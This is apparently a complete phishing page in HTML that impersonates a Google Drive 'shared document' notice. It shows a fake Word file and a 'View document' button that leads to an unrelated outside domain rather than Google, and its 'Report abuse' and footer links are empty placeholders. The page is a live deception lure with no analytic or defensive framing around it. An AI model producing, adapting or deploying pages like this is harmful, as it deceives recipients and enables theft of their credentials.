<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Shared Item</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com" rel="stylesheet">
</head>
<body>
    <main class="viewport">
        <div class="card">
            <!-- Pure CSS Google Drive Logo -->
            <div class="drive-logo-wrap">
                <div class="logo-shape">
                    <div class="tri-side yellow"></div>
                    <div class="tri-side green"></div>
                    <div class="tri-side blue"></div>
                </div>
                <span class="brand-name">Google Drive</span>
            </div>

            <h1 class="headline">Shared Document</h1>
            <p class="subtext">A file has been shared with you via Google Drive.</p>

            <div class="file-preview-card">
                <div class="doc-icon-css">
                    <div class="dog-ear"></div>
                    <div class="lines"></div>
                </div>
                <div class="file-info">
                    <div class="name">Proposal_File.docx</div>
                    <div class="meta">Word Document • 1.2 MB</div>
                </div>
            </div>

            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="primary-button">View document</a>

            <footer class="card-footer">
                Don't recognize this sender? <a href="#" class="link">Report abuse</a>
            </footer>
        </div>

        <nav class="external-links">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </nav>
    </main>
</body>
</html>
